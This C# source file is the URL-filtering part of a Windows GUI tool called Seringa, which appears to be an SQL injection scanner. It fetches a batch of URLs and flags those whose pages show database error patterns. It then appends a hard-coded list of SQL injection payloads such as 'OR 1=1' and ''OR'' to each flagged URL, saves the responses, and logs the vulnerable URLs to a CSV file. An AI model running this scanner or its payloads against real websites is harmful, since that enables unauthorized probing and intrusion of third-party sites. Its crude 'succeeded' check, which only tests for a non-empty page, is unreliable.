using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows;
using System.Threading;
using Seringa.Engine.Implementations.QueryRunners;
using Seringa.Engine.Utils;
using Seringa.Engine.DataObjects;
using System.Text.RegularExpressions;

namespace Seringa.GUI
{
    public partial class MainWindow
    {
        private bool _stopCurActionFilterUrlsTab = false;

        private void btnCancelFilterUrls_Click(object sender, RoutedEventArgs e)
        {
            _stopCurActionFilterUrlsTab = true;
        }
        private static string GetFileName(string hrefLink)
        {
            string[] parts = hrefLink.Split('/');
            string fileName = "";
            int k = 0;
            for (k = 0; k < parts.Length; k++)
            {
                if (parts[k].Contains("www"))
                {
                    //    char[] temp = 'www.';

                    fileName = parts[k].Remove(0, 4);
                }

            }

            if (fileName.Length < 2)
            {
                fileName = parts[2];
            }

            //  if (parts.Length > 0)
            //    fileName = parts[parts.Length - 1];
            //else
            //  fileName = hrefLink;

            return fileName;
        }
        System.IO.StreamWriter sw1;
        private void btnCheckUrls_Click(object sender, RoutedEventArgs e)
        {
            string name = GetFileName(txtSearchEngineUrl.Text);
            name = name + "_injections"+ ".csv";
            sw1 = new System.IO.StreamWriter(name);
            string[] injects = new string[10];
            injects[0] = "OR 1=1–";
            injects[1] = "'OR'";
            injects[2] = "'OR";
            injects[3] = "OR '0' = '0'";
            injects[4] = "') OR ('0' = '0'";
            injects[5] = "'UNION'";
            injects[6] = "'WHERE'";
            injects[7] = "'22";
            injects[8] = "'";
            injects[9] = "'''";
           // injects[2] = "'OR";
            IList<string> vulnerableResults = new List<string>();
            IList<string> urlsToCheck = new List<string>();
            string[] separators = new string[] { Environment.NewLine };
            IList<PatternDetails> patterns = new List<PatternDetails>();
            string urlBatch = txtUrls.Text;

            btnCheckUrls.IsEnabled = false;
            txtProbablyVulnerableUrls.Clear();
            bool possiblyVulnerable = false;
            System.IO.StreamWriter tempSW;

            var th = new Thread(() =>
            {
                var queryRunner = new SimpleQueryRunner();

                if (!string.IsNullOrEmpty(urlBatch))
                    urlsToCheck = urlBatch.Split(separators, StringSplitOptions.RemoveEmptyEntries).ToList();

                foreach (var url in urlsToCheck)
                {
                    if (_stopCurActionFilterUrlsTab == true)
                        break;

                    possiblyVulnerable = false;

                    IList<string> possiblyVulnerableUrls = Seringa.Engine.Utils.UrlHelpers.GeneratePossibleVulnerableUrls(url);//TODO:multiple possible vulnerable urls

                    foreach(var possiblyVulnerableUrl in possiblyVulnerableUrls)
                    {
                        string pageHtml = string.Empty;

                        try
                        {
                            pageHtml = queryRunner.GetPageHtml(possiblyVulnerableUrl, null);//@TODO:proxify
                        }
                        catch (Exception ex)
                        {
                            //@TODO: Log Exception
                        }

                        patterns = XmlHelpers.GetObjectsFromXml<PatternDetails>(FileHelpers.GetCurrentDirectory() + "\\xml\\patterns.xml", "pattern", null);
                        string pats = "";
                        foreach (var pattern in patterns)
                        {
                            if(pattern != null && !string.IsNullOrEmpty(pattern.Value))
                            if(pageHtml.IndexOf(pattern.Value) > -1)
                            {
                                possiblyVulnerable = true;
                                pats+=pattern.Dbms+"," + pattern.Value+",";
                                break;
                            }
                        }

                        if (possiblyVulnerable)
                        {
                            string name10 = "";
                            for (int k=0; k< injects.Length; k++)
                            {
                                name10 = possiblyVulnerableUrl + injects[k];
                                 try
                        {
                            pageHtml = queryRunner.GetPageHtml(name10, null);//@TODO:proxify
                            if(pageHtml.Length> 0)
                                    {
                                        System.Console.WriteLine("injecttion succeeded....." + name10);
                                    }
                        }
                        catch (Exception ex)
                        {
                            //@TODO: Log Exception
                        }

                        patterns = XmlHelpers.GetObjectsFromXml<PatternDetails>(FileHelpers.GetCurrentDirectory() + "\\xml\\patterns.xml", "pattern", null);
                        pats = "";
                        foreach (var pattern in patterns)
                        {
                            if(pattern != null && !string.IsNullOrEmpty(pattern.Value))
                            if(pageHtml.IndexOf(pattern.Value) > -1)
                            {
                                possiblyVulnerable = true;
                                pats+=pattern.Dbms+"," + pattern.Value+",";
                                break;
                            }
                        }
                            }
                            
                            gridFilterUrls.Dispatcher.Invoke(
                                System.Windows.Threading.DispatcherPriority.Normal,
                                new Action(
                                    delegate()
                                    {
                                        string name1 = possiblyVulnerableUrl;
                                        Regex rgx = new Regex("[^a-zA-Z0-9 -]");
                                        name1 = rgx.Replace(name1, "");
                                        name1 =name1+ ".html";
                                        tempSW = new System.IO.StreamWriter(name1);
                                        tempSW.WriteLine(pageHtml);
                                        tempSW.Flush();
                                        tempSW.Close();
                                        txtProbablyVulnerableUrls.Text += possiblyVulnerableUrl + Environment.NewLine;
                                        sw1.WriteLine(possiblyVulnerableUrl + "," + pats);
                                        System.Console.WriteLine(url + "vulnerable" + possiblyVulnerableUrl + ", " + pats);
                                        sw1.Flush();
                                    }));
                        }
                        else
                        {
                            System.Console.WriteLine(url + "   not vulnerable" );
                        }
                    }
                }

                _stopCurActionFilterUrlsTab = false;
                sw1.Close();
                MessageBox.Show("done");
                gridFilterUrls.Dispatcher.Invoke(
                    System.Windows.Threading.DispatcherPriority.Normal,
                    new Action(
                    delegate()
                    {
                        btnCheckUrls.IsEnabled = true;
                    }
                ));
            });
            th.Start();
           
        }

        
    }
}
